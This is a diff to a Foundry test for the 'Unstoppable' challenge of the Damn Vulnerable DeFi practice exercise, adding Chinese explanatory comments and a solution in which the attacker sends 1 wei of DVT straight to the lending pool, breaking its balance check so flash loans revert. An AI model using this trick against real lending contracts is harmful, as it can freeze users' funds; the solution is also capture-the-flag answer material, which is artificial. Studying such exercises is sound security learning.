@@ -9,8 +9,8 @@ import {UnstoppableLender} from "../../../src/Contracts/unstoppable/UnstoppableL
 import {ReceiverUnstoppable} from "../../../src/Contracts/unstoppable/ReceiverUnstoppable.sol";
 
 contract Unstoppable is Test {
-    uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;
-    uint256 internal constant INITIAL_ATTACKER_TOKEN_BALANCE = 100e18;
+    uint256 internal constant TOKENS_IN_POOL = 1_000_000e18; // 池子里有100w ether的DVT代币
+    uint256 internal constant INITIAL_ATTACKER_TOKEN_BALANCE = 100e18; // attacker拥有的代币数量
 
     Utilities internal utils;
     UnstoppableLender internal unstoppableLender;
@@ -32,13 +32,14 @@ contract Unstoppable is Test {
         dvt = new DamnValuableToken();
         vm.label(address(dvt), "DVT");
 
-        unstoppableLender = new UnstoppableLender(address(dvt));
+        unstoppableLender = new UnstoppableLender(address(dvt)); // 新建了一个池子实例
         vm.label(address(unstoppableLender), "Unstoppable Lender");
 
         dvt.approve(address(unstoppableLender), TOKENS_IN_POOL);
-        unstoppableLender.depositTokens(TOKENS_IN_POOL);
+        unstoppableLender.depositTokens(TOKENS_IN_POOL); // 给池子实例存了一个初始的流动性
 
         dvt.transfer(attacker, INITIAL_ATTACKER_TOKEN_BALANCE);
+        // 给attacker账户转了100 ether数量的token
 
         assertEq(dvt.balanceOf(address(unstoppableLender)), TOKENS_IN_POOL);
         assertEq(dvt.balanceOf(attacker), INITIAL_ATTACKER_TOKEN_BALANCE);
@@ -49,14 +50,19 @@ contract Unstoppable is Test {
             address(unstoppableLender)
         );
         vm.label(address(receiverUnstoppable), "Receiver Unstoppable");
-        receiverUnstoppable.executeFlashLoan(10);
+        receiverUnstoppable.executeFlashLoan(10); // 这儿证明了是正常的,即闪电贷功能此时能够正常使用
         vm.stopPrank();
         console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
     }
 
     function testExploit() public {
         /** EXPLOIT START **/
+        
+        vm.prank(attacker);
+        dvt.transfer(address(unstoppableLender), 1 wei);
+
         /** EXPLOIT END **/
+
         vm.expectRevert(UnstoppableLender.AssertionViolated.selector);
         validation();
     }
